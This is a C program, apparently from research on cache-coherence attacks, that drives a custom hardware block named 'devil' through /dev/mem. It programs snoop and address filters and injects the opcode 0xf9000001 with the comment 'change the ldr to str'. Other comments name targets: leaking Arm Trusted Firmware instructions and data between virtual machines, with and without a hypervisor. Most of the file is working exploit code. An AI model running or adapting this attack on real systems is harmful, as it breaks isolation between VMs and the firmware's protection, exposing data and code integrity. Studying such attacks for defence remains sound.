#include <stdio.h>
#include <stdlib.h>
#include <fcntl.h>
#include <unistd.h>
#include <sys/mman.h>

// Control Reg bits
#define EN_pos      0
#define TEST_pos    1
    #define TEST_FUZZ       0
    #define TEST_DELAY_CR   1
    #define TEST_DELAY_CD   2
    #define TEST_DELAY_CL   3
#define FUNC_pos    5
    #define FUNC_OSH        0
    #define FUNC_CON        1
    #define FUNC_ADL        2
    #define FUNC_ADT        3
    #define FUNC_PDT        4
#define CRRESP_pos  9
#define ACFLT_pos   14
#define ADDRFLT_pos 15
#define OSHEN_pos   16
#define CONEN_pos   17
#define ADLEN_pos   18
#define ADTEN_pos   19
#define PDTEN_pos   20

// Status Reg bits
#define OSH_END_pos 0

#define READ_ONCE           0b0000
#define WRITE_LINE_UNIQUE   0b001
#define WRITE_BACK          0b011

int main() {
    int mem_fd;
    unsigned int *map_base;
    unsigned int devil_base = 0x80010000;
    unsigned int *ctrl;
    unsigned int *status;
    unsigned int *p_delay;
    unsigned int *acsnoop;
    unsigned int *base_addr;
    unsigned int *mem_size;
    unsigned int *arsnoop;
    unsigned int *l_araddr;
    unsigned int *h_araddr;
    unsigned int *rdata_0;
    unsigned int *rdata_1;
    unsigned int *rdata_2;
    unsigned int *rdata_3;
    unsigned int *awsnoop;
    unsigned int *l_awaddr;
    unsigned int *h_awaddr;
    unsigned int *wdata_0;
    unsigned int *wdata_1;
    unsigned int *wdata_2;
    unsigned int *wdata_3;

    // Open /dev/mem to access physical memory
    mem_fd = open("/dev/mem", O_RDWR | O_SYNC);
    if (mem_fd == -1) {
        perror("Error opening /dev/mem");
        exit(1);
    }

    // Map physical memory into user space
    map_base = mmap(NULL, 4096, PROT_READ | PROT_WRITE, MAP_SHARED, mem_fd, devil_base);
    if (map_base == MAP_FAILED) {
        perror("mmap() failed");
        close(mem_fd);
        exit(1);
    }

    ctrl = map_base;
    status = map_base+1;
    p_delay = map_base+2;
    acsnoop = map_base+3;
    base_addr = map_base+4;
    mem_size = map_base+5;
    arsnoop = map_base+6;
    l_araddr = map_base+7;
    h_araddr = map_base+8;
    rdata_0 = map_base+9;
    rdata_1 = map_base+10;
    rdata_2 = map_base+11;
    rdata_3 = map_base+12;
    awsnoop = map_base+13;
    l_awaddr = map_base+14;
    h_awaddr = map_base+15;
    wdata_0 = map_base+16;
    wdata_1 = map_base+17;
    wdata_2 = map_base+18;
    wdata_3 = map_base+19;

    // Passive Instruction leak  
    //  - ATF (OCM) -> 0xFFFEA000 
    //      To validate, hexdump -C bl31.elf  (start at offset 0x0000a000 ) 
    // Data leak between VMs 
    //  - Data addr -> 0x40000000
    
    *wdata_0 = 0xf9000001; // change the ldr to str
    *wdata_1 = 0xf9000001; // change the ldr to str
    *wdata_2 = 0xf9000001; // change the ldr to str
    *wdata_3 = 0xf9000001; // change the ldr to str
    // Address Filter
                    
    *base_addr  = 0x40000100; 
    // *base_addr  = 0x20001580; // without bao
    // *base_addr  = 0x038016c0; // with bao
    *mem_size   = 0x4;
    // Snoop Filter
    *acsnoop = 0x1;

    *ctrl    =    (0b00001 << CRRESP_pos) 
                | (1 << ACFLT_pos) 
                | (1 << ADDRFLT_pos) 
                | (1 << PDTEN_pos)               
                | (FUNC_PDT << FUNC_pos) 
                | (1 << EN_pos);

    // while (1)
    // {
    // // printf(" ctrl = 0x%08x\n", *ctrl);
    // printf(" addr = 0x%08x\n", *l_awaddr);
    // *ctrl |= (1 << EN_pos); // Enable IP
    // // // while (!(*ctrl & (1 << EN_pos)));
    // for (size_t i = 0; i < 1000; i++);   
    // // for (size_t i = 0; i < 10000000; i++);   
    // printf(" ctrl = 0x%08x\n", *ctrl);   
    // // printf(" rdata1 = 0x%08x\n", *rdata1);
    // // printf(" rdata2 = 0x%08x\n", *rdata2);
    // // printf(" rdata3 = 0x%08x\n", *rdata3);
    // // printf(" rdata4 = 0x%08x\n", *rdata4);
    // *ctrl &= ~(1 << EN_pos); // Disable IP
    // // printf(" ctrl = 0x%08x\n", *ctrl);   
    // *l_awaddr = *l_awaddr + 0x10;
    // }
    // Unmap memory and close /dev/mem
    munmap(map_base, 4096);
    close(mem_fd);
    
    printf("Done!\n");

    return 0;
}